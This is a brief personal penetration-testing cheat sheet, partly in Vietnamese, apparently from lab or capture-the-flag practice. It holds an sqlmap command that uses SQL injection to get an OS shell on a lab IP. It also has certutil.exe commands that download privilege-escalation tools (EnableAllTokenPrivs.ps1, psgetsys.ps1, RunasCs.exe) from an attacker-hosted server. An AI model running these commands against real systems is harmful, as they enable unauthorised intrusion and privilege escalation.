# tool
advanched sqlmap:  
có thể copy nội dung res từ burp sau đó có tó thể scan bằng file req đó
sqlmap --url="http://10.129.247.166/dashboard.php?search=sandy" --cookie="PHPSESSID=530lii3ob5pbh3hii8rifld73o" --os-shell

https://github.com/vulhub
## window 
certutil.exe
certutil.exe -urlcache -split -f "http://IP:8000/EnableAllTokenPrivs.ps1" ".\EnableAllTokenPrivs.ps1"
certutil.exe -urlcache -split -f "http://IP:8000/psgetsys.ps1" ".\psgetsys.ps1"
certutil.exe -urlcache -split -f "http://IP:8000/RunasCs.exe" ".\RunasCs.exe"
# not sure
sudo update-alternatives --config java
ps aux | grep "^root*"
